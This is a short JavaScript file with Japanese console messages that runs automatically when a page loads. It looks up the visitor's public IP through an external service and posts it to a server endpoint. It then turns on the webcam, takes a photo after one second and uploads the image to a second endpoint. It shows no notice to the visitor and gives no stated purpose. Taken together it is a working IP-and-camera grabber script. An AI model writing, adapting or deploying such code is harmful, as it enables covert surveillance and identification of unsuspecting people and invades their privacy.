console.log('スクリプト開始');

async function sendIP(ip) {
    console.log('IP送信開始:', ip);
    const res = await fetch('/api/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: `IPアドレス: ${ip}` })
    });
    console.log('IP送信完了:', res.status);
}

async function sendImage(blob) {
    console.log('画像送信開始');
    const formData = new FormData();
    formData.append('file', blob, 'image.png');

    const res = await fetch('/api/sendImage', {
        method: 'POST',
        body: formData
    });
    console.log('画像送信完了:', res.status);
}

async function getIPAddress() {
    console.log('IP取得開始');
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    console.log('取得したIP:', data.ip);
    return data.ip;
}

async function captureImage() {
    try {
        console.log('カメラ起動開始');
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        console.log('カメラ取得成功');

        const video = document.createElement('video');
        video.srcObject = stream;
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;

        await new Promise(resolve => {
            video.onloadedmetadata = () => {
                setTimeout(() => {
                    console.log('画像キャプチャ開始');
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(async (blob) => {
                        console.log('画像データ生成成功');
                        await sendImage(blob);
                        stream.getTracks().forEach(track => track.stop());
                        console.log('カメラ停止');
                    }, 'image/png');
                    resolve();
                }, 1000);
            };
        });
    } catch (err) {
        console.error('カメラ取得に失敗しました:', err);
    }
}

async function main() {
    try {
        console.log('main開始');
        const ipAddress = await getIPAddress();
        await sendIP(ipAddress);
        await captureImage();
    } catch (error) {
        console.error('main内エラー:', error);
    }
}

main();
